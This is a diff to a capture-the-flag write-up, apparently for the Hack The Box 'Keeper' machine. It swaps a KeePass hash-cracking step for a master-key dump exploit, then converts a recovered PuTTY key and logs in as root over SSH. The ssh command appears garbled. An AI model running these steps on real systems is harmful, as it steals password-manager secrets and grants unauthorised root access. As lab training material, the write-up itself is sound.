@@ -42,11 +42,33 @@ nc -l -p 9090 > keeper.zip
 
 Unzip:
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8ec9d78e-9d40-4420-b4cb-517a8f99204b)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/627729c4-cd6b-4b2e-9971-1ae72ea275aa)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/30d383ff-39b0-4970-8222-c95ea6cf0fe8)
 
-Cracking KeePass Database:
+Dump KeePass Master Key:
+Use the python exploit below to dump the master key.
 ```
-keepass2john passcodes.kdbx > passcodes.hash
+https://github.com/CMEPW/keepass-dump-masterkey
 ```
 ```
-john --wordlist=/usr/share/wordlists/rockyou.txt passcodes.hash
+python3 keepassdump.py -d KeePassDumpFull.dmp
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0b2c3f74-9f20-4b71-95ee-b92ff5cd5e46)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/158807b7-c6fc-4df9-a6b8-3658ac94f884)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/91db3c89-e497-4c89-a33a-0a878fe5f8f2)
+
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f3bda035-9f4d-45b0-aeac-2c6f7c0744c9)
+
+Save the key as `key.ppk`
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d7f25ece-bdd7-4d5a-819d-ec68c3e98412)
+
+Convert the key to `.pem` format:
+```
+puttygen key.ppk -O private-openssh -o key.pem
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/047944e5-e3de-4037-80f6-5f47037ef3fa)
+
+SSH as root:
+```
+ssh root@10.10.11.227 - key.pem
 ```
